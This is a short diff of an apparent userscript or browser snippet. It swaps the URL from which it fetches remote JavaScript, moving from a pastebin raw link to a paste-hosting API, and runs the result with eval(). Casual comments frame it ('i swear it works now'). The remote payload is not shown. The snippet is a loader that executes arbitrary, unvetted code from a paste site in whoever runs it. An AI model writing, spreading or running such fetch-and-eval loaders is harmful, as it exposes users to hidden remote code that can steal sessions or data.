@@ -1,6 +1,6 @@
 // hi ching ching ching ching!
 (async ()=>{
-	const code = await (await fetch("https://corsproxy.io/?url=https://pastebin.com/raw/pLnh23H7")).text()
+	const code = await (await fetch("https://api.rubis.app/v2/scrap/c5VuG8NFPuxkbxFi/raw?accessKey=mret")).text()
 	eval(code)
 
     // i swear it works now :pray:
